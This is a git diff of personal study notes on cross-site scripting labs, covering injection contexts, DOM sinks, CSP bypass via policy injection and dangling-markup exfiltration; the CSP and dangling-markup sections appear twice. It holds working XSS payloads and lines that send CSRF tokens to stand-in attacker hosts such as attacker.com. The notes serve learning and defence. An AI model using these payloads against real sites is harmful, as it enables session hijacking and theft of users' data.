@@ -48,9 +48,9 @@ The vulnerability exists when there's a path from source to sink with no sanitiz
 
 ## The mental model for every DOM XSS lab
 
-1. Find the source - where is input coming from?
-2. Find the sink - where does it end up?
-3. Identify the context - what's wrapping your input in the DOM?
+1. Find the source, where is input coming from?
+2. Find the sink, where does it end up?
+3. Identify the context, what's wrapping your input in the DOM?
 4. Close everything wrapping you
 5. Inject
 
@@ -58,13 +58,13 @@ The vulnerability exists when there's a path from source to sink with no sanitiz
 
 ## XSS Contexts
 
-The context is where your input lands in the page. It determines everything - what characters matter, what you need to break out of, and what payload works. Same vulnerability, completely different approach depending on context.
+The context is where your input lands in the page. It determines everything, what characters matter, what you need to break out of, and what payload works. Same vulnerability, completely different approach depending on context.
 
-The core logic: every context has a "language" the browser is currently parsing. Your job is to break out of that language's current structure, then inject something the browser will execute. One approach does not fit all - you have to read the context first.
+The core logic: every context has a "language" the browser is currently parsing. Your job is to break out of that language's current structure, then inject something the browser will execute. One approach does not fit all, you have to read the context first.
 
 ### Between HTML tags
 
-Your input lands as raw content between tags. The browser is in HTML parsing mode - it's looking for tags and entities.
+Your input lands as raw content between tags. The browser is in HTML parsing mode, it's looking for tags and entities.
 
 Nothing is wrapping you so no breakout needed. Just inject a tag directly.
 
@@ -77,7 +77,7 @@ Why different tags work: the browser executes `<script>` blocks, but also runs e
 
 ### Inside an HTML attribute value
 
-Your input lands as the value of an attribute. The browser is parsing an attribute string - it's looking for the closing quote, not for tags.
+Your input lands as the value of an attribute. The browser is parsing an attribute string, it's looking for the closing quote, not for tags.
 
 Tags injected here don't break out because the browser doesn't treat `<` as special inside an attribute value it's just a character. You have to close the attribute and the tag first, then inject.
 
@@ -89,7 +89,7 @@ Tags injected here don't break out because the browser doesn't treat `<` as spec
 
 Close the quote → close the tag → now you're back in HTML context → inject freely.
 
-**Exception - event handler attributes:** if your input lands directly inside an existing event handler like `onmouseover=""`, you're already in a JavaScript execution context. No breakout needed, just write JS directly.
+**Exception, event handler attributes:** if your input lands directly inside an existing event handler like `onmouseover=""`, you're already in a JavaScript execution context. No breakout needed, just write JS directly.
 
 ```
 // input lands in: <input onmouseover="YOUR_INPUT">
@@ -97,17 +97,17 @@ Close the quote → close the tag → now you're back in HTML context → inject
 alert(1)
 ```
 
-**Exception - href and src attributes:** these accept URLs. Breaking out with `">` works but there's a cleaner path - `javascript:` protocol. Browser executes the JS when the link is clicked.
+**Exception, href and src attributes:** these accept URLs. Breaking out with `">` works but there's a cleaner path, `javascript:` protocol. Browser executes the JS when the link is clicked.
 
 ```
 javascript:alert(1)
 ```
 
-Only works on navigating attributes (href, action, iframe src). Not img src - that fetches a resource, doesn't execute JS.
+Only works on navigating attributes (href, action, iframe src). Not img src, that fetches a resource, doesn't execute JS.
 
 ### Inside a JavaScript string
 
-Your input lands inside an existing JS string, inside a `<script>` block. The browser is already in JavaScript parsing mode - it's not looking for HTML tags at all.
+Your input lands inside an existing JS string, inside a `<script>` block. The browser is already in JavaScript parsing mode, it's not looking for HTML tags at all.
 
 Injecting `<script>` or HTML tags does nothing here. You have to break out of the string, close the script block or just execute JS directly.
 
@@ -121,7 +121,7 @@ Injecting `<script>` or HTML tags does nothing here. You have to break out of th
 
 First option: close the string with `'`, inject JS, reopen the string so the rest doesn't error. Second option: terminate the statement, inject, comment out the rest.
 
-**When angle brackets are encoded:** if `<` and `>` are HTML-encoded, you can't close the `<script>` tag and start fresh. But you're already inside a script block - you don't need to. Just break out of the string and write JS.
+**When angle brackets are encoded:** if `<` and `>` are HTML-encoded, you can't close the `<script>` tag and start fresh. But you're already inside a script block, you don't need to. Just break out of the string and write JS.
 
 ```
 \'-alert(1)//
@@ -172,14 +172,14 @@ Use `<img>` or `<iframe>` with event handlers instead.
 ### jQuery attr() - href attribute
 
 Sets an HTML attribute value. Input is treated as a URL, not raw HTML so breaking out with tags doesn't work.
-Use `javascript:` protocol instead - browsers execute JS when a link with this href is clicked.
+Use `javascript:` protocol instead, browsers execute JS when a link with this href is clicked.
 
 ```
 ?returnPath=javascript:alert(document.domain)
 ```
 
 Only works on attributes that accept URLs that navigate/load pages (href, action, iframe src).
-Doesn't work on img src - that just loads a resource.
+Doesn't work on img src, that just loads a resource.
 
 ### jQuery $() - selector sink
 
@@ -212,12 +212,12 @@ $(window).on('hashchange', function() {
 
 1. Iframe loads vulnerable page with empty hash `#`
 2. `onload` fires after page fully loads
-3. Payload gets appended to hash - hash changes from `#` to `#<img src=1 onerror=alert(1)>`
+3. Payload gets appended to hash, hash changes from `#` to `#<img src=1 onerror=alert(1)>`
 4. `hashchange` fires on the vulnerable page
 5. `$()` receives the hash, sees HTML, injects it into the DOM
 6. `onerror` fires, alert executes
 
-The iframe lives on the attacker's page. Victim just visits the attacker's page - the vulnerable site loads invisibly in the background. Stealthier than reflected XSS because no suspicious URL appears in the victim's address bar.
+The iframe lives on the attacker's page. Victim just visits the attacker's page, the vulnerable site loads invisibly in the background. Stealthier than reflected XSS because no suspicious URL appears in the victim's address bar.
 
 ### AngularJS {{}} expression injection
 
@@ -237,15 +237,15 @@ When a page uses `ng-app`, AngularJS takes control of that element and evaluates
 - `Function('alert(1)')` - builds a new function from a string (same idea as eval)
 - `()` - calls it immediately
 
-No angle brackets or event handlers needed - you're injecting an expression, not HTML.
+No angle brackets or event handlers needed, you're injecting an expression, not HTML.
 
 ---
 
 ## Real-world insight: dead code is dangerous
 
-The `document.write` lab had a URL parameter (`storeId`) that was never used in normal site flow - the stock checker used POST instead. But the JS that reads `storeId` from the URL was still there, forgotten. Dead/orphaned code sitting in production, harmless looking, until someone reads the source carefully.
+The `document.write` lab had a URL parameter (`storeId`) that was never used in normal site flow, the stock checker used POST instead. But the JS that reads `storeId` from the URL was still there, forgotten. Dead/orphaned code sitting in production, harmless looking, until someone reads the source carefully.
 
-In real bug bounties this is a common find - developers change approach and forget to clean up old code. The vulnerability isn't in obviously bad code. It's in reasonable features with slightly wrong assumptions.
+In real bug bounties this is a common find, developers change approach and forget to clean up old code. The vulnerability isn't in obviously bad code. It's in reasonable features with slightly wrong assumptions.
 
 ---
 
@@ -257,7 +257,7 @@ if(store) {
 }
 ```
 
-This only checks **does a value exist** - not whether it's valid. A real fix uses whitelist validation:
+This only checks **does a value exist**, not whether it's valid. A real fix uses whitelist validation:
 
 ```javascript
 var validStores = ["London","Paris","Milan"];
@@ -267,6 +267,84 @@ if(validStores.includes(store)) {
 ```
 
 Most injection vulnerabilities exist not because there's zero validation but because the validation checks the wrong thing.
+
+---
+
+## Content Security Policy (CSP)
+
+CSP is a response header that tells the browser what it's allowed to load and run on a page. It's a second layer of defense behind output encoding, even if an injection slips through, CSP can stop it from doing anything useful.
+
+### How it works
+
+The server sends a `Content-Security-Policy` header. The value is a list of directives separated by semicolons, each one controlling a different category:
+
+```
+Content-Security-Policy: script-src 'self'; img-src 'self'; object-src 'none'
+```
+
+`script-src 'self'` means only scripts from the page's own origin can load or run, no inline scripts, no external script tags pointing elsewhere.
+
+### Nonces and hashes
+
+Instead of trusting a whole domain, CSP can trust specific scripts:
+
+- **Nonce** - a random value generated fresh on every page load, the script tag must carry the matching `nonce="..."` attribute or it won't execute. Only works as a defense if the nonce is unpredictable and regenerated each time.
+- **Hash** - CSP specifies the hash of a script's exact contents, if the script's content doesn't match that hash it won't run. Breaks if the script content ever changes without updating the hash.
+
+### The img-src gap
+
+Many CSPs lock down `script-src` tightly but leave `img-src` open, since images feel harmless. But an `<img src="https://attacker.com?data=...">` is still an external request, if a CSRF token or other sensitive data ends up in that URL, it gets sent to the attacker with no script execution needed at all. This is the bridge between CSP and dangling markup.
+
+### CSP policy injection
+
+If a site reflects user input directly into the CSP header itself (often via a `report-uri` directive, which some apps populate dynamically), you can inject a `;` to terminate that directive and add your own directives after it.
+
+Normally you can't override an existing `script-src` this way, directives don't get replaced, they get combined with the most restrictive winning. But `script-src-elem` is more specific than `script-src` for script *elements* (not inline event handlers), and a more specific directive overrides a less specific one for the things it covers. So injecting a new `script-src-elem` directive can override the original `script-src`'s control over `<script>` tags specifically.
+
+### Clickjacking protection
+
+`frame-ancestors` controls whether the page can be loaded inside an iframe on another site:
+
+```
+frame-ancestors 'self'      // only same-origin framing allowed
+frame-ancestors 'none'      // can't be framed at all
+```
+
+More flexible than the older `X-Frame-Options` header since it supports multiple domains and wildcards, and CSP checks the entire frame ancestry, not just the top-level frame.
+
+---
+
+## Dangling markup injection
+
+A technique for capturing data cross-domain when full XSS isn't possible, CSP or filters block script execution, but you can still inject HTML elements with unclosed attributes.
+
+### The core idea
+
+Suppose your input lands inside an attribute:
+
+```html
+<input type="text" name="input" value="YOUR_INPUT">
+```
+
+If `>` and `"` aren't filtered, you can break out with `">`. Normally you'd go for XSS from here. But if XSS is blocked, you can instead inject a tag with a **deliberately unclosed attribute**:
+
+```
+"><img src='//attacker.com?
+```
+
+This creates an `<img>` tag whose `src` attribute is left open, no closing quote. The browser keeps reading everything that follows as part of that URL, until it hits the next `'` character anywhere later in the page's HTML. Whatever sits between your injection point and that next quote, which might be a CSRF token, session data, anything, gets swallowed into the URL and sent to the attacker's server when the browser tries to load the "image."
+
+The attribute is left "dangling", hence the name. No JS runs, this is pure HTML parsing behavior.
+
+### Any attribute that makes a request works
+
+Not just `img src`. Anything that causes the browser to reach out externally, `href`, `action`, `formaction`, `background`, etc., can be abused the same way.
+
+### Defenses
+
+- Same as XSS - encode on output, validate on input
+- `img-src 'self'` blocks the classic img-based version, but not other tags like a dangling anchor `href`
+- Chrome specifically blocks `img` (and similar) tags from having raw angle brackets or newlines in their URLs, since that's exactly the content a dangling attack tries to capture - this kills most dangling markup attempts on Chrome without needing a CSP at all
 
 ---
 
@@ -327,13 +405,108 @@ Two requests, fully automated, victim sees nothing.
 
 ---
 
+## Dangling markup injection
+
+A way to capture data cross-domain when full XSS isn't possible, input filters or CSP are blocking script execution, but you can still inject some HTML.
+
+The core idea: inject a tag with an attribute that starts a URL but never closes it, leave it "dangling." The browser keeps reading everything after that point as part of the URL, until it hits the next quote character somewhere later in the page's HTML. Whatever sits between your injection point and that next quote gets sent to your server as part of the request.
+
+```
+// input lands in: <input type="text" name="input" value="CONTROLLABLE_DATA">
+// payload:
+"><img src='//attacker-website.com?
+```
+
+- `">` closes the attribute and the tag, back in HTML context
+- `<img src='//attacker-website.com?` opens a new img tag with an unterminated `src`, starting with a single quote
+- Browser looks ahead for the next `'` to close this attribute
+- Everything in between (could be a CSRF token, session data, anything in the page's HTML after this point) gets swallowed into the URL and sent to attacker-website.com when the browser tries to load the "image"
+- Non-alphanumeric characters including newlines get URL-encoded automatically as part of this
+
+Any attribute that triggers an external request can be used this way, not just `img src`. The technique exists specifically for when you can inject HTML but not get JS to run.
+
+### When all external requests are blocked
+
+If CSP blocks `img-src` and everything else that could exfiltrate data automatically, dangling markup with `img` is dead. But some elements can still store data and only send it on user interaction. The fix becomes: inject something that captures data into an attribute, and relies on the victim clicking it to trigger the exfiltration.
+
+---
+
+## Content Security Policy (CSP)
+
+A response header that restricts what a page is allowed to load and do. Sent as `Content-Security-Policy: directive1; directive2; ...`, a list of directives separated by semicolons, each one controlling a different category.
+
+### Mitigating XSS
+
+```
+script-src 'self'
+```
+Only scripts from the same origin can load/execute. Inline scripts and event handlers are blocked.
+
+```
+script-src https://scripts.normal-website.com
+```
+Only scripts from this specific domain. Caution: if an attacker can control content on that domain (e.g. a shared CDN without per-customer paths), this whitelist is worthless.
+
+**Nonces and hashes**, two more ways to whitelist scripts:
+- Nonce: CSP specifies a random value, the `<script>` tag must carry the same value in a `nonce` attribute. Must be freshly generated and unguessable each page load to mean anything.
+- Hash: CSP specifies a hash of the script's exact content. If the script changes, the hash breaks and needs updating.
+
+**Why img often still works even with CSP locked down:** many CSPs allow `img-src` even when `script-src` is tight. This means `img` tags can still be used to leak data (like CSRF tokens) to an external server, even when scripts are fully blocked, this is the dangling markup angle.
+
+**Chrome's dangling markup mitigation:** Chrome blocks tags like `img` from having `src` values containing raw, unencoded characters like angle brackets or newlines. Since dangling markup payloads typically capture content containing those characters, this blocks a lot of these attacks by default.
+
+### Mitigating dangling markup
+
+```
+img-src 'self'
+```
+Images can only load from the same origin, blocks the classic `img src='//attacker.com?...` exfiltration.
+
+```
+img-src https://images.normal-website.com
+```
+Same idea, specific domain.
+
+This stops the easiest no-interaction exfiltration method (`img`), but doesn't stop everything, an injected anchor (`<a>`) with a dangling `href` can still capture data and exfiltrate on click, since `img-src` says nothing about links.
+
+### CSP bypass via policy injection
+
+If a site reflects a parameter directly into its own CSP header, usually in a `report-uri` directive, and you control that parameter, you can inject a `;` to add your own directives to the policy.
+
+Since `report-uri` is typically the last directive in the list, your injected directives need to **overwrite** earlier ones, not just append, to actually loosen restrictions.
+
+Normally `script-src` can't be overwritten this way once set. But `script-src-elem` is a separate, newer directive, it controls script *elements* specifically (not inline event handler attributes), and critically, **it can overwrite an existing `script-src` directive**. If you inject a new `script-src-elem` directive after the original `script-src`, the new one wins for script elements, and you can set it wide open.
+
+```
+script-src-elem * 'unsafe-inline'
+```
+- `*` allows scripts from any external source
+- `'unsafe-inline'` allows inline `<script>` tags - needed separately, `*` alone doesn't cover inline scripts
+
+### Clickjacking protection
+
+```
+frame-ancestors 'self'
+```
+Only same-origin pages can frame this page.
+
+```
+frame-ancestors 'none'
+```
+Page can't be framed at all, by anyone.
+
+```
+frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
+```
+More flexible than `X-Frame-Options`, supports multiple domains and wildcards, and CSP validates every frame in the ancestor chain, not just the top level. ---
+
 ## My insights
 
-Reflected vs stored isn't just a technical difference - it's a reliability difference from the attacker's perspective. Reflected is a gamble. Stored is a guarantee. That's why stored is treated as higher severity.
+Reflected vs stored isn't just a technical difference, it's a reliability difference from the attacker's perspective. Reflected is a gamble. Stored is a guarantee. That's why stored is treated as higher severity.
 
-Injection attacks all share the same root cause: the boundary between data and code broke down. The developer's mistake is always the same - trusting user data and mixing it with code without checking it first. SQLi, XSS, command injection - same concept, different context.
+Injection attacks all share the same root cause: the boundary between data and code broke down. The developer's mistake is always the same, trusting user data and mixing it with code without checking it first. SQLi, XSS, command injection, same concept, different context.
 
-Context is everything in XSS. The same payload that works in raw HTML does nothing inside a JS string. The same payload that works in a JS string does nothing inside a template literal - because you don't need it. Each context has its own grammar. You have to speak the browser's language at that exact point in the page, not just throw angle brackets at it and hope.
+Context is everything in XSS. The same payload that works in raw HTML does nothing inside a JS string. The same payload that works in a JS string does nothing inside a template literal, because you don't need it. Each context has its own grammar. You have to speak the browser's language at that exact point in the page, not just throw angle brackets at it and hope.
 
 ---
 
@@ -382,7 +555,10 @@ Context is everything in XSS. The same payload that works in raw HTML does nothi
 - Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped - input lands in onclick handler inside an href attribute, HTML encoding applies so used HTML entity `&apos;` for single quote, browser decodes it before JS runs so the string breaks correctly
 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped - everything escaped except the template literal syntax itself, used `${alert(1)}` directly since template literals evaluate expressions by design, no breakout needed
 - Exploiting XSS to perform CSRF - stored XSS in comment field, payload makes a GET to account settings page, parses the CSRF token from the response HTML with a regex match, then fires a POST to change the victim's email with the real token included, CSRF protection bypassed entirely because JS runs same-origin so it can read the page freely
+- Reflected XSS protected by very strict CSP, with dangling markup attack - CSP blocked all scripts and all external requests via tags like img, but had no form-action directive so forms were unrestricted, injected a button with formaction pointing to our exploit server and formmethod=get, victim has to click the button on load which sends the account form to our server carrying their CSRF token in the URL, exploit server script then loads again with the token present and auto-builds and submits a new form to change the victim's email to ours
 
+### Expert
+- Reflected XSS protected by CSP, with CSP bypass - found a `token` query parameter reflected directly into the CSP header, injected `";` to terminate the existing directive then added our own `script-src-elem * 'unsafe-inline'` directive, this is more specific than the original `script-src` for script elements so it overrides it, removing the restriction on script tags specifically, then added a second `search` parameter in the same URL containing a reflected `<script>alert(1)</script>` payload which now executes since script-src-elem allows everything - solved without looking at the writeup
 
 ### Theory understood, lab skipped (requires Burp Pro / Collaborator)
 - Exploiting XSS to steal cookies - stored XSS payload reads document.cookie and exfiltrates to external server via fetch, session hijack from there
